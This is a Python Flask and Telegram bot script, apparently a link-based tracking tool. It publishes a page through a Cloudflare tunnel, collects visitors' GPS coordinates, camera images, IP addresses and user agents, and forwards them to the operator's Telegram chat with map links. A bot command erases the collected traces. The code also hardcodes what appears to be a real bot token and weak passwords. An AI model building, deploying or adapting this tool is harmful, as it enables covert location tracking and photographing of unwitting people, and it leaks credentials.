from flask import Flask, request, jsonify, send_file
from flask_httpauth import HTTPBasicAuth
import sqlite3
from datetime import datetime
import os
import subprocess
import threading
import time
import re
import webbrowser
import asyncio
import traceback
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# -------------------- Flask Setup --------------------
app = Flask(__name__)
auth = HTTPBasicAuth()
users = {"admin": "pass123"}

@auth.verify_password
def verify_password(username, password):
    return username if username in users and users[username] == password else None

# -------------------- Folder Setup --------------------
SAVE_FOLDER = "saved_files"
os.makedirs(SAVE_FOLDER, exist_ok=True)

# -------------------- Database Setup --------------------
def init_db():
    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS osint_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  type TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  file_path TEXT)''')
    conn.commit()
    conn.close()

init_db()

# -------------------- Cloudflared Tunnel --------------------
def start_cloudflared(timeout=30):
    try:
        cloudflared_path = os.path.join(os.getcwd(), "cloudflared.exe")
        process = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        print("[✓] Starting Cloudflare tunnel...")

        start_time = time.time()
        for line in process.stdout:
            print("[cloudflared]", line.strip())
            if "https://" in line and "trycloudflare.com" in line:
                match = re.search(r"(https://[^\s]+)", line)
                if match:
                    url = match.group(1)
                    print(f"[🌐] Public URL: {url}")
                    return url

            if time.time() - start_time > timeout:
                print("[!] Timeout: Tunnel URL not found.")
                process.terminate()
                break

    except FileNotFoundError:
        print("[ERROR] 'cloudflared.exe' not found in current directory.")
    except Exception as e:
        print(f"[ERROR] Failed to start Cloudflare tunnel: {e}")

    return None

# -------------------- Telegram Bot Setup --------------------
TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"  # Replace with your actual bot token
AUTHORIZED_KEY = "secretkey123"
authenticated_users = set()

def send_telegram_message(message):
    for user_id in authenticated_users:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": user_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, data=data)

def send_telegram_image(image_path, caption=""):
    for user_id in authenticated_users:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(image_path, "rb") as photo:
            files = {"photo": photo}
            data = {"chat_id": user_id, "caption": caption}
            requests.post(url, files=files, data=data)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 Please authenticate using /auth <key>")
        return
    tunnel_url = context.bot_data.get("tunnel_url", "⚠️ Tunnel URL not available.")
    await update.message.reply_text(f"✅ Server is live!\n🌐 URL: {tunnel_url}")

async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /auth <key>")
        return
    if context.args[0] == AUTHORIZED_KEY:
        authenticated_users.add(user_id)
        await update.message.reply_text("🔑 Authenticated successfully!")
    else:
        await update.message.reply_text("❌ Invalid key!")

async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")

async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 You are not authenticated.")
        return

    deleted_files = 0
    for file in os.listdir(SAVE_FOLDER):
        file_path = os.path.join(SAVE_FOLDER, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
            deleted_files += 1

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("DELETE FROM osint_data")
    conn.commit()
    conn.close()

    await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")

def start_bot(tunnel_url):
    try:
        print("[🤖] Starting Telegram bot...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
        app.bot_data["tunnel_url"] = tunnel_url

        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("auth", auth))
        app.add_handler(CommandHandler("chatid", chatid))
        app.add_handler(CommandHandler("delete", delete))

        app.run_polling(close_loop=False)
        print("[✅] Telegram bot is running!")

    except Exception as e:
        print(f"[❌] Bot failed to start: {e}")
        traceback.print_exc()

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    return send_file('static/index.html')

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("""INSERT INTO osint_data
                 (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
              ("location", data['latitude'], data['longitude'], data['accuracy'],
               datetime.utcnow().isoformat(), ip_address, user_agent))
    conn.commit()
    conn.close()

    msg = (
        "📍 *New Location Received:*\n"
        f"Latitude: `{data['latitude']}`\n"
        f"Longitude: `{data['longitude']}`\n"
        f"Accuracy: ±{data['accuracy']} m\n"
        f"[📍 View on Map](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
        f"IP: `{ip_address}`\n"
        f"UA: `{user_agent}`"
    )
    send_telegram_message(msg)

    return jsonify({"status": "OK"}), 200

@app.route('/upload_image', methods=['POST'])
def upload_image():
    if 'image' not in request.files:
        return jsonify({"error": "No image uploaded"}), 400

    image_file = request.files['image']
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
    image_file.save(filename)

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("""INSERT INTO osint_data (type, file_path, timestamp)
                 VALUES (?, ?, ?)""",
              ("image", filename, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

    send_telegram_image(filename, caption="🖼️ New Image Uploaded")

    return jsonify({"status": "OK"}), 200

# -------------------- Main --------------------
if __name__ == '__main__':
    tunnel_url = start_cloudflared()
    if tunnel_url:
        threading.Thread(target=start_bot, args=(tunnel_url,), daemon=True).start()
        webbrowser.open(tunnel_url)
        app.run(host='127.0.0.1', port=5000, debug=True, use_reloader=False)
    else:
        print("❌ Could not start tunnel. Bot and server not started.")
